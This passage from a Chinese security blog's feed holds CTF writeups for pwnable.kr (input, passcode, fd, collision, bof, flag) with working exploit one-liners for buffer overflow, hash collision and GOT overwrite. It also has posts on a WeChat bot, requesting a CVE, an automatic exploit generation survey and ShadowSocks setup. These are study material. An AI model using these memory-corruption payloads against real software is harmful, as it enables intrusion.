/tmp/l0l/stderr</span></span><br><span class="line"><span class="comment"># input2@ubuntu:~$ python -c 'print "\x00\x0a\x00\xff"' &gt; /tmp/l0l/stdin</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Stage 2 cleared (Change the  files stdin and stderr refer to in the process call)</span></span><br><span class="line"></span><br><span class="line">env = &#123;&#125;</span><br><span class="line">env[<span class="string">"\xde\xad\xbe\xef"</span>] = <span class="string">"\xca\xfe\xba\xbe"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Stage 3 cleared (Add env to the process call)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># $ python -c 'fd = open("/tmp/l0l"+"\x0a", "w"); fd.write("\x00\x00\x00\x00"); fd.close()'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Stage 4 cleared (Run the python file from /tmp directory)</span></span><br><span class="line"></span><br><span class="line">argv[<span class="number">67</span>] = <span class="string">"11123"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Stage 5 cleared (Run the client executable when in interactive mode)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Last step is to create a symlink from flag to /home/input2/flag</span></span><br><span class="line"></span><br><span class="line">p = process(argv=argv, stdin=open(<span class="string">"/tmp/lulz/stdin"</span>, <span class="string">"r"</span>), stderr=open(<span class="string">"/tmp/lulz/stderr"</span>, <span class="string">"r"</span>), env=env)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>此时，利用 socket 向 pwnable.kr:11123 发送 “\xde\xad\xbe\xef” 即可。实现方式有多种，此处依然使用 pwntools，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">"127.0.0.1"</span>, <span class="number">11123</span>))</span><br><span class="line">s.send(<span class="string">"\xde\xad\xbe\xef"</span>)</span><br></pre></td></tr></table></figure><p>获取到 flag 如下。<br><img src="/2018/12/14/Pwnable-3/input-flag.png" alt=""></p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://r00tk1ts.github.io/2018/03/06/input/" target="_blank" rel="noopener">《Writeup.pwnable.kr系列之input》</a>  </p><p><a href="https://www.akashtrehan.com/writeups/pwnablekr_todders_bottle/" target="_blank" rel="noopener">《pwnable.kr - Toddler’s Bottle》</a></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Pwnable（二）</title>
      <link href="/2018/12/08/Pwnable-2/"/>
      <url>/2018/12/08/Pwnable-2/</url>
      
        <content type="html"><![CDATA[<p>本文为 pwnable.kr 第五关 passcode 的 writeup。题目中主要涉及变量未初始化、格式化字符串与GOT表覆写三个知识点，变量未初始化与格式化字符串造成 <a href="https://rootkits.xyz/blog/2017/09/kernel-write-what-where/" target="_blank" rel="noopener">WRITE_WHAT_WHERE</a>，结合GOT表覆写，最终获取到 Flag。<br><a id="more"></a></p><h2 id="0x00-背景知识"><a href="#0x00-背景知识" class="headerlink" title="0x00 背景知识"></a>0x00 背景知识</h2><p>本节仅简要介绍 GOT/PLT 基本概念，详细内容可自行查阅，其中涉及的 ELF 文件格式可参考<a href="http://flint.cs.yale.edu/cs422/doc/ELF_Format.pdf" target="_blank" rel="noopener">《ELF_Format》</a>。</p><p><strong>GOT（Global Offset Table）：</strong>GOT 位于 .got.plt section 中，用以记录 ELF 文件中所用到的共享库中符号的绝对地址。程序初始化时，GOT 表项为空，当符号被首次调用时会动态解析对应地址，并将该地址保存在 GOT 中，之后再次调用该符号时，无需解析，直接跳转至 GOT 表中所保存的地址。</p><p><strong>PLT（Procedure Linkage Table）：</strong>PLT 位于 .plt section 中，用以将位置无关的符号转移到绝对地址。当一个外部符号被调用时，PLT 去引用 GOT 中的其符号对应的绝对地址，然后转入并执行。</p><p>当前的操作系统一般都支持 NX 特性，通常情况下 PLT 具有可执行权限(X)，没有写(W)权限；GOT 具有写权限，却不可执行。这是由于链接器运行时填充的区域，必须是可写的，但可写的区域一般不可执行，对于外部函数来说需要引入一个可执行的区域作为引导，这就是PLT的作用。同时，这也是将 PLT 与 GOT 分开的原因。下图展示了 GOT 表中存有对应符号地址时的寻址过程。<br><img src="/2018/12/08/Pwnable-2/GOT:PLT.png" alt=""></p><h2 id="0x01-变量未初始化"><a href="#0x01-变量未初始化" class="headerlink" title="0x01 变量未初始化"></a>0x01 变量未初始化</h2><p><img src="/2018/12/08/Pwnable-2/first.png" alt=""></p><p>登录服务器后查看当前目录，共有 passcode.c、passcode、flag 三个文件。尝试读取 flag 内容，提示权限不够。执行 passcode，产生段错误。<br>  <img src="/2018/12/08/Pwnable-2/ls-crash.png" alt=""></p><p>查看 passcode.c 文件，发现 login() 函数中的局部变量未初始化，且 main() 函数中 welcome() 与 login() 连续调用，推测两函数 ebp 相同。<br><img src="/2018/12/08/Pwnable-2/code1.png" alt=""></p><p>  利用 GDB 对 passcode 进行调试，输入 120 个 ’A‘，由于代码中对输入长度进行了限制，因此 welcome() 函数中的 scanf() 仅接收 100 个字节。此时栈内数据如图所示。<br>  <img src="/2018/12/08/Pwnable-2/welcome.jpg" alt=""></p><p>  继续调试，跟进 login() 函数，查看栈布局，发现 24 个字节被 ’A‘ 污染。对比 login() 汇编代码与源代码，分析后可知，通过构造 welcome() 函数中的输入数据，可实现对 login() 函数中 passcode1 变量中所存储内容的完全控制。<br>  <img src="/2018/12/08/Pwnable-2/debug-login.png" alt=""></p><h2 id="0x02-scanf"><a href="#0x02-scanf" class="headerlink" title="0x02 scanf()"></a>0x02 scanf()</h2><p>再次检查 passcode.c 文件，发现 scanf() 第二个参数缺少 &amp;。<br><img src="/2018/12/08/Pwnable-2/code2.png" alt=""><br>查看对应汇编代码，其中取地址时使用了 mov 而非 lea 指令，这使得scanf()产生内存写入漏洞。<br><img src="/2018/12/08/Pwnable-2/disas-scanf.png" alt=""><br>至此，利用变量未初始化与 scanf() ，已可实现 WRITE_WHAT_WHERE。</p><h2 id="0x03-GOT-覆写"><a href="#0x03-GOT-覆写" class="headerlink" title="0x03 GOT 覆写"></a>0x03 GOT 覆写</h2><p>查看 passcode 开启的安全选项，RELRO 选项为”Partial RELRO“，意味着可以采用GOT表覆写技术实现攻击。<br><img src="/2018/12/08/Pwnable-2/checksec.png" alt="">  </p><p>查看 section 信息，发现 GOT 具有写权限。<br><img src="/2018/12/08/Pwnable-2/readelf.png" alt=""></p><p>至此，思路已清晰，将passcode1 中所存储的内容布局为随后将会调用的 fflush() 函数地址，并在调用到 scanf(“%d”, passcode1) 时输入 passcode 中调用 system(“/bin/cat flag”) 时的地址即可。<br><img src="/2018/12/08/Pwnable-2/code4.png" alt=""></p><p>程序没有开启 PIE，无需 leak，通过 GOT 表获取到 fflush() 地址 “0x0804a004”。</p><p><img src="/2018/12/08/Pwnable-2/got.png" alt=""></p><p> 获取 passcode 中调用 system(“/bin/cat flag”) 时的地址，“0x080485e3”<br><img src="/2018/12/08/Pwnable-2/login.png" alt=""></p><p>(0x080485e3==134514147)<br><img src="/2018/12/08/Pwnable-2/cal.png" alt=""></p><p>构造exp如下并成功获取到 flag：  </p><p><code>python -c &quot;print 96*&#39;A&#39;+&#39;\x04\xa0\x04\x08&#39;+&#39;134514147&#39;&quot; | ./passcode”</code></p><p><img src="/2018/12/08/Pwnable-2/flag.jpg" alt=""></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://rickgray.me/2015/08/07/use-gdb-to-study-got-and-plt/" target="_blank" rel="noopener">《通过 GDB 调试理解 GOT/PLT》</a><br><a href="https://blog.csdn.net/anzhsoft/article/details/18776111" target="_blank" rel="noopener">《Linux Debugging（七）: 使用反汇编理解动态库函数调用方式GOT/PLT》</a><br><a href="https://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html" target="_blank" rel="noopener">《深入了解GOT,PLT和动态链接》</a><br><a href="https://pediy.com/thread-205334.htm" target="_blank" rel="noopener">《利用got表pwn学习》</a><br><a href="https://r00tk1ts.github.io/2018/03/05/Pwnable-2/" target="_blank" rel="noopener">《Writeup.pwnable.kr系列之passcode》</a><br><a href="https://www.nrjfl0w.org/index.php/2016/09/04/passcode-writeup-pwnable/" target="_blank" rel="noopener">《[Pwnable.kr] passcode writeup – Toddler’s bottle》</a><br><a href="http://xhyumiracle.com/pwnable-kr-Pwnable-2/" target="_blank" rel="noopener">《Pwnable.kr - passcode》</a></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Pwnable（一）</title>
      <link href="/2018/12/07/Pwnable-1/"/>
      <url>/2018/12/07/Pwnable-1/</url>
      
        <content type="html"><![CDATA[<p>作为刚接触 PWN 的菜鸡，在学习相关知识的同时，通过 <a href="http://pwnable.kr" target="_blank" rel="noopener">pwnable.kr</a>来检验学习成果。本文记录了 pwnable 前四关所涉及的知识点，作为学习笔记以备日后 review。  </p><a id="more"></a><h2 id="0x01-fd"><a href="#0x01-fd" class="headerlink" title="0x01 fd"></a>0x01 fd</h2><p>本题较为简单，涉及的知识点为 Linux 文件描述符。默认情况下标准输入的文件描述符为“0”，标准输出的文件描述符为“1”，错误输出的文件描述符为“2”。<br> <img src="/2018/12/07/Pwnable-1/stdin.png" alt=""></p><p>访问题目时给出的提示。<br><img src="/2018/12/07/Pwnable-1/fd.png" alt=""></p><p>登录服务器后，当前目录下共有三个文件 fd.c、fd、flag。查看 fd.c 内容。<br>  <img src="/2018/12/07/Pwnable-1/fd-code.png" alt=""></p><p>通过代码可知，首先将 “argv[1]” 转为 “int” 然后与 “0x1234” 相减，结果存入 “fd” 中。之后，将读入数据与 “LETMEWIN” 相比较，若一致，则读取 flag。基于以上分析，仅需将 “atoi(argv[1]) - 0x1234” 的值构造为 “0”，程序即可从标准输入中读取数据，通过输入 “LETMEWIN” 即可读取 flag。0x1234 = 4660，flag 如图。 </p><p><img src="/2018/12/07/Pwnable-1/fd-flag.png" alt=""></p><h2 id="0x02-collision-解题思路不唯一"><a href="#0x02-collision-解题思路不唯一" class="headerlink" title="0x02 collision(解题思路不唯一)"></a>0x02 collision(解题思路不唯一)</h2><p>题目提示信息如下。<br><img src="/2018/12/07/Pwnable-1/col.png" alt=""></p><p>登录服务器后查看当前目录下的 col.c 文件。<br>  <img src="/2018/12/07/Pwnable-1/col-code.png" alt=""></p><p>通过阅读代码可知，check_password()将输入的 20 bytes 数据以长度 “int * ”（4 byte）为单位进行累加，将累加结果与 “0x21DD09EC” 比较。根据对代码的理解，构造输入数据，最朴素的思路可以将输入数据构造为“(\x01\x01\x01\x01) * 4 + \xe8\x05\xd9\x1d”。最终构造 exp 如下：<br><code>./col $(python -c &quot;print &#39;\x01\x01\x01\x01&#39; * 4 + &#39;\xe8\x05\xd9\x1d&#39;&quot;)</code><br><img src="/2018/12/07/Pwnable-1/col-flag.png" alt=""></p><h2 id="0x03-bof"><a href="#0x03-bof" class="headerlink" title="0x03 bof"></a>0x03 bof</h2><p>本题主要考察最基础的栈溢出。<br><img src="/2018/12/07/Pwnable-1/bof.png" alt=""></p><p>查看源代码 bof.c，在 func() 中，要利用栈溢出覆盖变量 “key” 的内容，使之等于“0xcafebabe”，即可获得 flag。<br>反编译 bof，分析 func()。通过汇编代码可知，局部变量 “overflowme[32]” 的地址为 “ebp-0x2c”，需要覆盖的地址为 “ebp+0x8”，因此偏移量为 “0x34”。目标操作系统采用小端序存储，因此将“0xcafebabe”布局为“\xbe\xba\xfe\xca”。</p><p><img src="/2018/12/07/Pwnable-1/bof-analysis.png" alt=""></p><p>根据以上分析，构造输入数据为 “\x41 * 52 + \xbe\xba\xfe\xca”，使用 GDB 进行验证。由上图可知，输入数据成功的将 “ebp+0x8” 处的内容覆盖为“0xcafebabe”。最终 exp 为：<br><code>(python -c &quot;print &#39;\x41&#39;*52 + &#39;\xbe\xba\xfe\xca&#39;&quot;;cat)|(nc pwnable.kr 9000)</code><br><img src="/2018/12/07/Pwnable-1/bof-flag.png" alt=""></p><h2 id="0x04-flag"><a href="#0x04-flag" class="headerlink" title="0x04 flag"></a>0x04 flag</h2><p>如同给出的提示，本题侧重于 reverse。<br><img src="/2018/12/07/Pwnable-1/flag.png" alt=""></p><p>利用 “strings” 命令查看 flag 文件中的字符串，检测到 UPX 壳。<br><img src="/2018/12/07/Pwnable-1/upx.png" alt=""></p><p>使用 “upx -d flag” 脱壳。<br><img src="/2018/12/07/Pwnable-1/unupx.png" alt=""><br>通过 GDB 调试脱壳后的 flag。<br><img src="/2018/12/07/Pwnable-1/gdb.png" alt=""><br>在 main() 入口设置断点，查看汇编代码即可获取到 flag。</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Mr.WxRobot</title>
      <link href="/2018/11/27/Mr-WxRobot/"/>
      <url>/2018/11/27/Mr-WxRobot/</url>
      
        <content type="html"><![CDATA[<p>由于项目需要，最近了解了下微信机器人。通过对微信个人号的自动化操作，不仅可以实现自动陪聊、抢红包、群消息同步等功能，甚至能够实现<a href="https://github.com/zeusees/HyperLPR" target="_blank" rel="noopener">车牌识别</a>、<a href="https://blog.csdn.net/weixin_40193776/article/details/78111724" target="_blank" rel="noopener">OCR等功能</a>。调研后发现两个项目比较受欢迎<a href="https://github.com/littlecodersh/ItChat" target="_blank" rel="noopener">itchat</a>与<a href="https://github.com/youfou/wxpy" target="_blank" rel="noopener">wxpy</a>。项目的 Star 与 Fork 数量都颇为可观。<br><a id="more"></a><br><img src="/2018/11/27/Mr-WxRobot/itchat.jpg" alt="itchat"></p><p><img src="/2018/11/27/Mr-WxRobot/wxpy.jpg" alt="wxpy"><br>wxpy 是在 itchat 的基础上，通过对接口的优化、功能的扩展，进一步提升了模块的易用性，在必要的时候也可以直接调用 itchat 原始接口。基于以上原因，最终选用 wxpy。</p><h2 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h2><p>wxpy 支持 Python 3.4-3.6，以及 2.7 版本，安装非常简单，根据官方文档支持以下两种安装方式:</p><ul><li>从 PYPI 官方源下载安装 (在国内可能比较慢或不稳定):</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -U wxpy</span><br></pre></td></tr></table></figure><ul><li>从豆瓣 PYPI 镜像源下载安装 (<strong>推荐国内用户选用</strong>):  </li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -U wxpy -i &quot;https://pypi.doubanio.com/simple/&quot;</span><br></pre></td></tr></table></figure><h2 id="二、基本功能"><a href="#二、基本功能" class="headerlink" title="二、基本功能"></a>二、基本功能</h2><ol><li>登陆微信:</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 导入模块</span><br><span class="line">from wxpy import *</span><br><span class="line"># 初始化机器人，扫码登陆</span><br><span class="line">bot = Bot()</span><br></pre></td></tr></table></figure><ol start="2"><li>找到好友:</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 搜索名称含有 &quot;游否&quot; 的男性深圳好友</span><br><span class="line">my_friend = bot.friends().search(&apos;游否&apos;, sex=MALE, city=&quot;深圳&quot;)[0]</span><br></pre></td></tr></table></figure><ol start="3"><li>发送消息:</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 发送文本给好友</span><br><span class="line">my_friend.send(&apos;Hello WeChat!&apos;)</span><br><span class="line"># 发送图片</span><br><span class="line">my_friend.send_image(&apos;my_picture.jpg&apos;)</span><br></pre></td></tr></table></figure><ol start="4"><li>自动响应各类消息:</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 打印来自其他好友、群聊和公众号的消息</span><br><span class="line">@bot.register()</span><br><span class="line">def print_others(msg):</span><br><span class="line">    print(msg)</span><br><span class="line"></span><br><span class="line"># 回复 my_friend 的消息 (优先匹配后注册的函数!)</span><br><span class="line">@bot.register(my_friend)</span><br><span class="line">def reply_my_friend(msg):</span><br><span class="line">    return &apos;received: &#123;&#125; (&#123;&#125;)&apos;.format(msg.text, msg.type)</span><br><span class="line"></span><br><span class="line"># 自动接受新的好友请求</span><br><span class="line">@bot.register(msg_types=FRIENDS)</span><br><span class="line">def auto_accept_friends(msg):</span><br><span class="line">    # 接受好友请求</span><br><span class="line">    new_friend = msg.card.accept()</span><br><span class="line">    # 向新的好友发送消息</span><br><span class="line">    new_friend.send(&apos;哈哈，我自动接受了你的好友请求&apos;)</span><br></pre></td></tr></table></figure><ol start="5"><li>保持登陆/运行:</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 进入 Python 命令行、让程序保持运行</span><br><span class="line">embed()</span><br><span class="line"></span><br><span class="line"># 或者仅仅堵塞线程</span><br><span class="line"># bot.join()</span><br></pre></td></tr></table></figure><h2 id="三、小结"><a href="#三、小结" class="headerlink" title="三、小结"></a>三、小结</h2><p>由于项目提供的<a href="https://wxpy.readthedocs.io/zh/latest/" target="_blank" rel="noopener">官方 API</a> 非常详尽，并且网络上有很多大神写的 Demo，因此编写一个功能简单的机器人非常便捷。需要注意的是，在测试过程中尽量避免使用个人主用号码，存在被限制登录 Web 微信的可能。</p>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mr.Robot </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>初试 CVE</title>
      <link href="/2018/11/16/First-CVE/"/>
      <url>/2018/11/16/First-CVE/</url>
      
        <content type="html"><![CDATA[<p>作为一只信安菜鸡，也不晓得从何时起心心念念的想拥有属于自己的 CVE-ID。基于这简单的愿景，于是摇摇摆摆的迈开了尝试的步伐…  </p><a id="more"></a><h2 id="0x00-关于-CVE"><a href="#0x00-关于-CVE" class="headerlink" title="0x00 关于 CVE"></a>0x00 关于 CVE</h2><p><strong>1、简介</strong><br>CVE(Common Vulnerabilities &amp; Exposures，通用漏洞披露) 是国际著名的安全漏洞库，也是对已知漏洞和安全缺陷的标准化名称列表。是一个由业界、政府以及学术界组成的非盈利性的国际组织，其使命是为了更加快速而有效地鉴别、发现并修复软件产品中的安全漏洞。<br><img src="/2018/11/16/First-CVE/cve.png" alt=""></p><p><strong>2、组织机制</strong><br>CANs(CVE Numbering Authority) 是 CVE-ID 的实际分发机构，METRE 依照按需分配的原则向 CNA 成员分配 CVE-ID 编号池，供其分发漏洞编号。详细列表可参看<a href="https://cve.mitre.org/cve/request_id.html#cna_coverage" target="_blank" rel="noopener">CANs成员</a>。<br><img src="/2018/11/16/First-CVE/cna.png" alt=""></p><p><strong>3、申请流程</strong><br>METRE 并不会主动发放 CVE-ID，需要申请者向 CNAs 提出申请，通常情况下包含以下环节：<br>1）挖掘漏洞，编写PoC；<br>2）通报厂商，留存相关材料（PoC、截图、链接等）；<br>3）在 CVE 网站上发起申请，并依照要求填写相关内容；<br>4）METRE 向申请者发放 CVE-ID，同时根据 CVE-ID 在官网上创建“空白”页面；<br>5）审核通过后 METRE 向申请者确认 CVE-ID，并更新 CVE 网站上对应漏洞的内容。</p><h2 id="0x01-实践检验"><a href="#0x01-实践检验" class="headerlink" title="0x01 实践检验"></a>0x01 实践检验</h2><p>1、 漏洞确认<br>此次尝试以“Distributed Weakness Filing Project”的方式申请 CVE 编号。首先在 Github 上选择感兴趣的项目，然后针对该项目进行漏洞挖掘，成功后编写PoC并提交 Issues。<br><img src="/2018/11/16/First-CVE/xss.png" alt=""></p><p>2、 申请 CVE-ID<br><a href="https://request.distributedweaknessfiling.org" target="_blank" rel="noopener">申请地址</a>，依照要求填写相关内容（共需六步），漏洞细节提交 Issue 对应的链接即可。<br><img src="/2018/11/16/First-CVE/2.png" alt=""><br>完成申请后会收到来自 MITRE 的邮件。<br><img src="/2018/11/16/First-CVE/email-1.png" alt=""></p><p>3、 喜提 ID<br>两天后收到 CVE 申请通过的邮件通知，至此获得了第一个 CVE-ID。事实上，CVE 编号只是一个规范化的产物，真正的含金量还得看实际内容。援引tk教主的话：“喜悦主要来自于漏洞本身，以及探索和挑战的过程”。目前还是太菜，需要学习的东西太多，争取来年能够输出具有含金量的 CVE。</p>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>漏洞自动化利用</title>
      <link href="/2018/11/16/AEG-Research-Status/"/>
      <url>/2018/11/16/AEG-Research-Status/</url>
      
        <content type="html"><![CDATA[<p>二进制漏洞的挖掘与利用始终是网络安全的核心内容之一。目前，漏洞挖掘的自动化程度已经较高，各类并行 Fuzz 平台已能够高效产出大量 Crash。面对 Crash，如何快速判定其可利用性，并编写利用程序是亟待解决的问题。Crash 的可利用性判定属于另一个研究方向，相关内容本文并不涉及。针对 Exploit 的自动生成问题，学术界有一个专有名词：Automatic Exploit Generation。AEG 是安全研究领域首次将“利用自动生成”作为一个研究课题，也代表着漏洞利用自动化的研究逐步拉开序幕。下文将针对 AEG 的研究历程进行简要介绍。</p><a id="more"></a><p><img src="/2018/11/16/AEG-Research-Status/AEG.png" alt=""></p><p><strong>1、 APEG</strong><br>APEG 是 D.Brumley 等人在 2008 年的 IEEE S&amp;P 会议上首次提出的基于二进制补丁比较的漏洞利用自动生成方法。该方法利用二进制差异比较查找补丁位置，通过分析补丁代码，生成能够触发漏洞的输入数据，结合污点分析技术生成可利用程序。虽然 APEG 的核心思想较为简单，但由于具备较强的可操作性而得到普遍认可。相关论文《Automatic Patch-Based Exploit Generation is Possible: Techniques and Implications》</p><p><strong>2、 AEG</strong><br>为了克服 APEG 对于补丁的依赖以及无法构造控制流劫持的缺陷， T.Avgerinos 等人在 2011 年的 NDSS 会议上提出了 AEG，一种基于源码的劫持控制流的自动利用方案。AEG 采用了前向符号执行与动态指令插桩技术，能够生成具备控制流劫持能力的利用样本，是第一个真正意义上的面向控制流劫持的自动化构建方案。相关论文《AEG: Automatic Exploit Generation》</p><p><strong>3、 Mayhem</strong><br>由于 AEG 依赖程序源代码并受限于编译器等环境因素。S.K.Cha 等人在 2012 年的 IEEE S&amp;P 会议上提出了基于二进制的自动利用方案 Mayhem。该方案采用在线式符号执行与离线式符号执行技术，通过内存建模实现较为实用的自动利用方案。相关论文《Unleashing MAYHEM on Binary Code》  </p><p><strong>4、 PolyAEG</strong><br>实现漏洞自动利用方案的重要性不言而喻，对于漏洞危害评估来说，生成高质量、多样性的漏洞利用样本同样意义重大。因此，M.HWang 等人在 2013 年 SecureComm 会议上提出了多样性利用样本自动生成方法 PolyAEG。该方案通过对 8 个漏洞样本进行试验，针对单个控制流劫持漏洞最多生成 4724 个利用样本，为漏洞危害评估提供了有效支持。相关论文《Automatic Polymorphic Exploit Generation for Software Vulnerabilities》  </p><p><strong>5、 FlowStitch</strong><br>2015 年 H.Hu 等人在 USENIX Security 会议上首次提出了面向数据流利用的自动化利用方案 FlowStitch。通过在 8 个真实漏洞样本上进行试验，FlowStitch 自动构建的 19 个利用样本不仅可以绕过数据执行以及细粒度控制流完整性等防护手段，并且其中 10 个利用样本还可以在开启地址随机化的环境下成功执行。相关论文《Automatic Generation of Data-Oriented Exploits》  </p><p><strong>6、Angr</strong><br>2016 年 Shoshitaishvili 等人在 IEEE S&amp;P 会议上提出了 Offensive Binary Analysis 技术，并开源了二进制分析平台 Angr。 作者所在团队所设计的 Cyber Reasoning System（CRS）Mechaphish 于 2016 年 DARPA 举办的 CGC 竞赛中荣获第三名。Mechaphish 系统中负责漏洞自动化利用的模块 Rex 正是基于 Angr 而实现。相关论文《(State of) The Art of War: Offensive Techniques in Binary Analysis》</p><p><strong>7、 Q</strong><br>为了应对漏洞缓解技术，特别是数据执行保护与地址随机化，E.J.Schwartz 等人在 2011 年的 USENIX Security 会议上提出了一套面向高可靠性漏洞利用的 ROP 代码自动生成方法 Q。严格来讲，ROP 代码生成方案应当属于 Exploit Hardening 而非 Exploit Generation。但面对当前越来越严格的漏洞利用缓解技术，ROP 为利用样本的稳定执行提供了有效的支撑。相关论文《 Q: Exploit hardening made easy》</p><p>自首次提出基于二进制补丁比对的漏洞自动化利用方案至今的十年间，针对 AEG 的研究已取得了明显的进展，但相较于漏洞利用的复杂性、安全防御技术的不断演进，要想使得 AEG 在复杂多变的网络对抗中产生实际应用尚有很多问题等待解决。  </p><p>本人属于刚接触二进制安全的菜鸟，文中内容主要参考中科院软件所苏璞睿老师的《软件漏洞自动利用研究进展》，所涉及论文正在逐步阅读中，力争在后续的学习过程中再产出一些阶段性的总结。</p><p><strong>参考文献：</strong><br><a href="http://openwall.info/wiki/_media/people/jvanegue/files/aegc_retro_2018_jvanegue.pdf" target="_blank" rel="noopener">《自动化漏洞利用的重大挑战回顾》</a><br><a href="https://github.com/maskhed/MyPapers/blob/master/和亮－苏璞睿－软件漏洞自动利用研究进展.pdf" target="_blank" rel="noopener">《软件漏洞自动利用研究进展》</a><br><a href="https://zhuanlan.zhihu.com/p/26690230" target="_blank" rel="noopener">《Automatic Exploit Generation：漏洞利用自动化》</a></p>]]></content>
      
      
      <categories>
          
          <category> AEG </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>基于搬瓦工的 ShadowSocks 搭建</title>
      <link href="/2018/11/06/SS%E6%90%AD%E5%BB%BA/"/>
      <url>/2018/11/06/SS%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p>在日常工作与学习过程中，没有Google实在不方便，之前一直使用IPv6作为替代解决方案，但在不支持IPv6的网络中很是尴尬，于是决定利用 VPS 结合 SS（ShadowSocks）搭建属于自己的梯子，做个相对长久的解决方案。</p><a id="more"></a><h2 id="0x00-VPS选购"><a href="#0x00-VPS选购" class="headerlink" title="0x00 VPS选购"></a>0x00 VPS选购</h2><p>想要访问谷歌等网站，首先需要一台国外的 VPS。目前提供国外 VPS 的主机商有很多，如国内的阿里云、腾讯云等，但服务价格相对较高，入门级ECS包年费用基本在300+rmb。<br><img src="/2018/11/06/SS搭建/%E9%98%BF%E9%87%8CECS.png" alt="阿里ECS"></p><p>作为仅提供简单的SS服务，性价比有待商榷。因此选择价位更加亲民且稳定不跑路的主机提供商“搬瓦工”，其优势如下：</p><ul><li>按月收费，价格低廉，当前最低年付 19.99 美元</li><li>服务稳定，速度较快</li><li>可一键切换机房，每 10 周可免费换一次 IP</li></ul><p>与“搬瓦工”同样出名的还有“ VULTR ”，相较于“搬瓦工”，“ VULTR ”的优势在于 VPS 可以随时创建与删除，0.01 美元即可换 IP 一次。 <strong>整体上来说，想要速度快的选择搬瓦工，怕 IP 被封则选择 VULTR。</strong><br>综合考虑各种因素，最终选购了“搬瓦工”的“Basic VPS-Self-managed-10G KVM-PROMO”，如何选择VPS配置及购买完成后对VPS的设置网上教程较多，<a href="https://www.yigeni.com/build-a-wall-ss-server/" target="_blank" rel="noopener">可自行百度</a>。由于“搬瓦工”支持支付宝，因此很是方便。<br><img src="/2018/11/06/SS搭建/bwg-vps.png" alt="bwg-vps"></p><h2 id="0x01-SS服务端配置"><a href="#0x01-SS服务端配置" class="headerlink" title="0x01 SS服务端配置"></a>0x01 SS服务端配置</h2><p>在完成VPS购置后，接下来要做的是安装SS服务端并进行配置。基于个人习惯，将 VPS 操作系统设置为 Ubuntu 16.04 x86_64，下文就以该OS版本为例进行说明。<br><strong>1、安装SS服务端</strong><br>首先提供SS<a href="https://shadowsocks.org/" target="_blank" rel="noopener">官方网站</a>、<a href="https://github.com/shadowsocks" target="_blank" rel="noopener">GitHub地址</a>。SS服务端安装相对简单，通常情况下依次执行如下命令即可：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt install python-pip</span><br><span class="line">pip install --upgrade pip</span><br><span class="line">pip install setuptools</span><br><span class="line">pip install shadowsocks</span><br></pre></td></tr></table></figure></p><p>执行完毕后，若无异常则表明安装成功。<br><strong>2、配置SS服务端</strong><br>SS配置文件为json格式，在“/etc” 或当前用户目录下创建配置文件，如“ shadowsock.json ”，并填写配置信息，格式参考<a href="https://github.com/shadowsocks/shadowsocks/wiki/Configuration-via-Config-File" target="_blank" rel="noopener">github官方实例</a>。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 